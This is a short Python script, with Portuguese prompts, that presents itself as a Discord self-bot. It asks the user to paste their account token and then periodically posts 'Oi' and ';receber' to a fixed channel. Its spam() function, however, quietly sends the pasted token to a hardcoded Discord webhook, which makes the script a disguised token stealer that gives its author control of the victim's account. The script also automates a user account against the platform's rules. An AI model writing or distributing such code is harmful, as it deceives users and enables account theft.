import requests
import time
print('''
  \033[1;32m _____ __  _____  ______________  __
  / ___// / / /   |/_  __/ ____/ / / /
  \__ \/ /_/ / /| | / / / __/ / / / / 
 ___/ / __  / ___ |/ / / /___/ /_/ /  
/____/_/ /_/_/  |_/_/ /_____/\____/\033[m
                                      ''')
                                      
print("  \033[36mCOLE O TOKEN SE N NAO IRA FUNCIONAR\033m")
print("   A FERRAMENTA N RECONHECE SE ESTA CERTO O TOKEN")
token = str(input("\n  COPIE SEU TOKEN E COLE NO TERMINAL \n"))
mensagem = "Oi"
id = "822481040022306899"


def spam():
	payload = {
		'content': token
	}
	
	header = {'authorization': token
	}
	
	r =	requests.post("https://discord.com/api/webhooks/822481191844184075/J6D4_Z4SB-S-UkylG-pQo3g4RGqIT4apihQ9f_yMhQ9P1FiEzwUPgtXmtMg7jaj585Md", data=payload, headers=header)
	return print("Começando")


def job():
	payload = {
		'content': mensagem
	}
	
	header = {'authorization': token
	}
	
	r =	requests.post("https://discord.com/api/v8/channels/" + id + "/messages", data=payload, headers=header)
	
	
def receber():
	payload = {
		'content': ";receber"
	}
	
	header = {'authorization': token
	}
	
	r =	requests.post("https://discord.com/api/v8/channels/" + id + "/messages", data=payload, headers=header)



spam()
while True:
	print(job())
	time.sleep(1802)
	print(receber())
	time.sleep(3)
